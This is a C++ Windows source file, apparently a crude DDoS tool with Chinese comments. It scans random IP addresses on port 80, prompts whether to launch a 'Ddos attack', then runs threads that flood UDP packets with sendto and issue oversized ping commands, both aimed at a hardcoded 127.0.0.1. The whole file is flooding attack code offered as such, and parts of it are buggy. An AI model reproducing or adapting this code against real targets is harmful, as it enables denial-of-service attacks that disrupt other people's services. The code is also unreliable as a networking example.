#include <Winsock2.h> 
#include <iostream>
#include <conio.h>
#include <time.h>
#include <string>
#include <thread>
//#pragma comment(lib,"ws2_32")

using namespace std;
string getIP();
DWORD WINAPI Thread(LPVOID lpParameter);
DWORD WINAPI pingThread(LPVOID lpParameter);
int main()
{
	srand(time(NULL));//为获取ip初始化时间种子
	WORD wVersionRequested = MAKEWORD(1, 1);
	WSADATA wsaData;
	
	int err = WSAStartup(wVersionRequested, &wsaData); //高字节是副版本，低字节是主版本,WSAStartup启动
	if (err != 0){
		return 0;
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1){//版本不对则退出
		WSACleanup();
		return 0;
	}
	
	SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN addrSrv;
	//得到有效IP
	while (true) {
		string ip = getIP();
		addrSrv.sin_addr.S_un.S_addr = inet_addr(ip.data());
		addrSrv.sin_family = AF_INET;
		addrSrv.sin_port = htons(80);
		bind(sockClient,(LPSOCKADDR) &addrSrv, sizeof(addrSrv));
		
		//int back = sendto(sockClient, "test", 100, 0, (SOCKADDR *)&addrSrv, sizeof(SOCKADDR));
		if (connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)) != SOCKET_ERROR) {
			cout << "Get a IP address:" << ip << endl;
			closesocket(sockClient);
			break;
		}
		else
			closesocket(sockClient);
	}

	int state = 1;
	cout << "是否对特定地址进行Ddos攻击?" << endl;
	cin >> state;
	if (state == 0)
		return 0;
	HANDLE H[4];
	cout << "先是利用sendto攻击";
	for (int i = 0; i < 4; ++i) {
		H[i] = CreateThread(NULL, 0, Thread, NULL, 0, NULL);
	}
	Sleep(10000);
	for (int i = 0; i < 4; ++i) {
		CloseHandle(H[i]);
	}
	
	cout << "再是利用ping攻击" << endl;
	system("pause");
	for (int i = 0; i < 4; ++i) {
		H[i] = CreateThread(NULL, 0, pingThread, NULL, 0, NULL);
	}
	Sleep(10000);
	for (int i = 0; i < 4; ++i) {
		CloseHandle(H[i]);
	}
	return 0;
}
string getIP() {
	//生成IP部分
	int IP[4];
	IP[0] = rand() % 256;
	IP[1] = rand() % 256;
	IP[2] = rand() % 256;
	IP[3] = rand() % 256;
	return to_string(IP[0]) + '.' + to_string(IP[1]) + '.' + to_string(IP[2]) + '.' + to_string(IP[3]);
}

DWORD WINAPI Thread(LPVOID lpParameter) {

	string ip = "127.0.0.1";
	SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = inet_addr(ip.data());
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(80);

	while (1) {
		sendto(sockClient, "ddos", 10000, 0, (SOCKADDR *)&addrSrv, sizeof(SOCKADDR));
		//closesocket(sockClient);
	}
	return 0;
};

DWORD WINAPI pingThread(LPVOID lpParameter) {

	string defaultip = "127.0.0.1";
	string cmd = "ping " + defaultip + " -l 65500 -n 15";
	//while(1)
		system(cmd.data());

	return 0;
};